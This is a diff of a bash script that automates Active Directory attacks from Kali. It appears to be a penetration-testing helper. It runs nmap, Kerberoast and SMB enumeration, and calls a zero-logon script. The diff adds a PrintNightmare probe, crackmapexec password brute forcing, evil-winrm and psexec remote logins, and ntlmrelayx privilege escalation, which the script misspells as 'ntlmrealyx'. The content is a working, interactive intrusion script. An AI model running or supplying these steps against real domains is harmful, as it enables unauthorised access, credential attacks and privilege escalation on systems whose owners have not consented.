@@ -2,8 +2,6 @@
 
 # May need to change location of Impacket, script looks at /home/kali/.local/lib/python3.9/site-packages/impacket/examples/
 
-# Script is used to enumerate AD from the outside, not all questions need answers. At the end you can also type y to run responder, it is up to you to make sure your responder.conf file is correct
-
 echo -e '\E[31;35m' "If Impacket is not within $PATH then you may need to put whole location into script"; tput sgr0
 
 sleep 2 
@@ -32,9 +30,9 @@ echo -e '\E[31;40m' "User File if any"; tput sgr0
 
 read USERFILE
 
-echo -e '\E[31;40m' "Running NMAP on certain ports, putting into $DOMAIN.txt"; tput sgr0
+echo -e '\E[31;35m' "Running NMAP to see what is open and putting in $DOMAIN.txt, only looking at certain ports"
 
-nmap -p 139,445,80,8080,8888,88,111,3389,5985,135,53,593,3269,636 -T4 -vv -Pn -n $DOMAINIP > $DOMAIN.txt
+nmap -p 139,445,80,8080,8888,111,3389,5985,135,53,593,3269,636,88 -vv -Pn -n -T4 $DOMAINIP > $DOMAIN.txt
 
 echo -e '\E[31;35m' "Finding Kerberoastable accounts if any"; tput sgr0
 
@@ -74,9 +72,16 @@ rpcclient -U "" -N DOMAINIP
 
 sleep 1
 
-echo -e '\E[31;40m' "Testing if SMB is open"
+echo -e '\E[31;40m' "Testing if SMB is open"; tput sgr0
 
 smbclient -L \\\\$DOMAINIP\\
+
+sleep 1
+
+echo -e '\E[31;40m' "Testing if vulnerable to Print Nightmare"; tput sgr0
+
+impacket-rpcdump @$DOMAINIP | egrep 'MS-RPRN|MS-PAR'
+impacket-rpcdump @$DOMAIN | egrep 'MS-RPRN|MS-PAR'
 
 sleep 1
 
@@ -100,6 +105,41 @@ if [ $answer = y ] ; then
 	echo 'SMB Share Name?'; tput sgr0
 	read SHARENAME
 	python3 $ZEROLOC "$SHARENAME" "$DOMAINIP"
+fi
+
+read -p "Test for Login Brute Force through Crackmapexec SMB? (y/n)" answer
+if [ $answer = y ] ; then
+	echo "Testing for brute force with username and pass file"
+	echo "Username or username file to test?"
+	read USERNAME
+	echo "Location of password file ex: (/usr/share/wordlists/fasttrack.txt)"
+	read PASSFILE
+	crackmapexec smb $DOMAINIP -u $USERNAME -p $PASSFILE -d $DOMAIN --continue-on-success
+fi
+
+read -p "Test for Evil-WinRM Login? (y/n)" answer
+if [ $answer = y ] ; then
+	echo "Username to test?"
+	read EVILUSER
+	echo "Password to use?"
+	read EVILPASS
+	evil-winrm -u $EVILUSER -p $EVILPASS -i $DOMAINIP
+fi
+
+read -p "Test for PSExec Login (y/n)" answer
+if [ $answer = y ] ; then
+	echo "Username to test?"
+	read PSUSER
+	echo "Password to test?"
+	read PSPASS
+	psexec.py "$DOMAIN/$PSUSER:$PSPASS@$DOMAINIP"
+fi
+
+read -p "Try and escalate user with ntlmrealyx.py? (y/n)" answer
+if [ $answer = y ] ; then
+	echo "User to test?"
+	read NTLMUSER
+	ntlmrealyx.py -t ldap://$DOMAINIP --escalate-user $NTLMUSER
 fi
 
 read -p "Do you want to open a new tab for responder? (y/n)" answer
